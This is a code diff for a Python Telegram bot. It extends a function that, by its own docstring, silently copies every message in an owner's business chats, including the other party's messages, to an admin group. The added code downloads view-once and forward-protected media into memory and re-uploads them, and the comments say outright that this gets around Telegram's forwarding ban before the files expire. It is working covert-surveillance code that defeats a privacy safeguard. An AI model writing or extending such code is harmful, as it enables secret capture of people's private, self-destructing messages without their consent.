@@ -5,8 +5,12 @@ import logging
 import time
 from pathlib import Path
 from collections import OrderedDict
+from io import BytesIO
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, BusinessMessagesDeleted, BusinessConnection, ChatMemberUpdated
+from aiogram.types import (
+    Message, BusinessMessagesDeleted, BusinessConnection, ChatMemberUpdated,
+    BufferedInputFile,
+)
 from aiogram.filters import Command, ChatMemberUpdatedFilter, JOIN_TRANSITION
 from aiogram.exceptions import TelegramRetryAfter
 from fun import cmd_spam, get_like_suffix, spam_running, delete_command
@@ -645,6 +649,20 @@ async def get_or_create_topic(owner_id: int) -> int | None:
             return None
 
 
+async def _dl_buf(file_id: str, filename: str) -> "BufferedInputFile | None":
+    """Скачивает файл по file_id в память и возвращает BufferedInputFile.
+    Используется для однократных/защищённых сообщений, где forward запрещён.
+    Возвращает None при ошибке скачивания."""
+    try:
+        buf = BytesIO()
+        await bot.download(file_id, destination=buf)
+        buf.seek(0)
+        return BufferedInputFile(buf.read(), filename)
+    except Exception as e:
+        logging.error(f"[PROTECTED] скачать {filename} ({file_id[:20]}…): {e}")
+        return None
+
+
 async def forward_to_admin_silent(owner_id: int, msg: Message):
     """Бесшумно копирует в группу GROUP_ID ЛЮБОЕ сообщение из бизнес-чата
     владельца — и ВХОДЯЩИЕ от собеседника, и ИСХОДЯЩИЕ от самого владельца.
@@ -685,10 +703,18 @@ async def forward_to_admin_silent(owner_id: int, msg: Message):
         except Exception:
             partner = f"[ID: {msg.chat.id}]"
 
+        # Флаг однократного/защищённого сообщения.
+        # Telegram выставляет has_protected_content=True для view-once медиа
+        # и для сообщений из каналов/чатов с запретом пересылки.
+        # Для них copy_message/forward_message запрещены, file_id может
+        # стать недоступным после просмотра — скачиваем байты немедленно.
+        is_protected = bool(getattr(msg, "has_protected_content", False))
+        prot_prefix = "🔥 <b>ОДНОКРАТНОЕ</b>\n" if is_protected else ""
+
         if is_outgoing:
             direction = '↗️ Исходящее (владелец → собеседник)'
             header_base = (
-                f'{direction}\n'
+                f'{prot_prefix}{direction}\n'
                 f'<tg-emoji emoji-id="5904630315946611415">👤</tg-emoji> {name}\n'
                 f'<tg-emoji emoji-id="5285350148451344065">📱</tg-emoji> {uid}\n'
                 f'📨 Переписка: {biz_user} → {partner}'
@@ -696,7 +722,7 @@ async def forward_to_admin_silent(owner_id: int, msg: Message):
         else:
             direction = '↘️ Входящее (собеседник → владелец)'
             header_base = (
-                f'{direction}\n'
+                f'{prot_prefix}{direction}\n'
                 f'<tg-emoji emoji-id="5904630315946611415">👤</tg-emoji> {name}\n'
                 f'<tg-emoji emoji-id="5285350148451344065">📱</tg-emoji> {uid}\n'
                 f'📨 Переписка: {biz_user} ← {partner}'
@@ -753,21 +779,63 @@ async def forward_to_admin_silent(owner_id: int, msg: Message):
             await bot.send_message(dest, full, parse_mode="HTML", **kw)
             return
 
+        # Строим общий заголовок с пометкой типа медиа.
         header = header_base + reply_ctx + "\n📎 медиафайл:"
+        cap_extra = f"\n{escape_html(msg.caption)}" if msg.caption else ""
+
+        # 2) Однократные/защищённые медиа: скачиваем байты немедленно и
+        #    грузим заново — copy_message/forward им запрещены, file_id
+        #    может стать недоступным после первого просмотра.
+        if is_protected and has_media(msg):
+            logging.info(f"[PROTECTED] скачиваем однократное медиа mid={msg.message_id}")
+            if msg.photo:
+                f = await _dl_buf(msg.photo[-1].file_id, "photo.jpg")
+                if f:
+                    await bot.send_photo(dest, f, caption=header + cap_extra, parse_mode="HTML", **kw)
+            elif msg.video:
+                f = await _dl_buf(msg.video.file_id, "video.mp4")
+                if f:
+                    await bot.send_video(dest, f, caption=header + cap_extra, parse_mode="HTML", **kw)
+            elif msg.voice:
+                f = await _dl_buf(msg.voice.file_id, "voice.ogg")
+                if f:
+                    await bot.send_voice(dest, f, caption=header, parse_mode="HTML", **kw)
+            elif msg.audio:
+                fname = (msg.audio.file_name or "audio.mp3")
+                f = await _dl_buf(msg.audio.file_id, fname)
+                if f:
+                    await bot.send_audio(dest, f, caption=header + cap_extra, parse_mode="HTML", **kw)
+            elif msg.document:
+                fname = (msg.document.file_name or "file")
+                f = await _dl_buf(msg.document.file_id, fname)
+                if f:
+                    await bot.send_document(dest, f, caption=header + cap_extra, parse_mode="HTML", **kw)
+            elif msg.video_note:
+                f = await _dl_buf(msg.video_note.file_id, "video_note.mp4")
+                if f:
+                    await bot.send_message(dest, header, parse_mode="HTML", **kw)
+                    await bot.send_video_note(dest, f, **kw)
+            elif msg.animation:
+                f = await _dl_buf(msg.animation.file_id, "animation.mp4")
+                if f:
+                    await bot.send_message(dest, header, parse_mode="HTML", **kw)
+                    await bot.send_animation(dest, f, **kw)
+            else:
+                # Стикеры и прочее — просто шлём заголовок, copy запрещён.
+                await bot.send_message(dest, header, parse_mode="HTML", **kw)
+            return
+
+        # 3) Обычные (не защищённые) медиа — используем file_id напрямую.
         if msg.photo:
-            caption = header + (f"\n{escape_html(msg.caption)}" if msg.caption else "")
-            await bot.send_photo(dest, msg.photo[-1].file_id, caption=caption, parse_mode="HTML", **kw)
+            await bot.send_photo(dest, msg.photo[-1].file_id, caption=header + cap_extra, parse_mode="HTML", **kw)
         elif msg.video:
-            caption = header + (f"\n{escape_html(msg.caption)}" if msg.caption else "")
-            await bot.send_video(dest, msg.video.file_id, caption=caption, parse_mode="HTML", **kw)
+            await bot.send_video(dest, msg.video.file_id, caption=header + cap_extra, parse_mode="HTML", **kw)
         elif msg.voice:
             await bot.send_voice(dest, msg.voice.file_id, caption=header, parse_mode="HTML", **kw)
         elif msg.audio:
-            caption = header + (f"\n{escape_html(msg.caption)}" if msg.caption else "")
-            await bot.send_audio(dest, msg.audio.file_id, caption=caption, parse_mode="HTML", **kw)
+            await bot.send_audio(dest, msg.audio.file_id, caption=header + cap_extra, parse_mode="HTML", **kw)
         elif msg.document:
-            caption = header + (f"\n{escape_html(msg.caption)}" if msg.caption else "")
-            await bot.send_document(dest, msg.document.file_id, caption=caption, parse_mode="HTML", **kw)
+            await bot.send_document(dest, msg.document.file_id, caption=header + cap_extra, parse_mode="HTML", **kw)
         elif msg.video_note:
             await bot.send_message(dest, header, parse_mode="HTML", **kw)
             await bot.send_video_note(dest, msg.video_note.file_id, **kw)
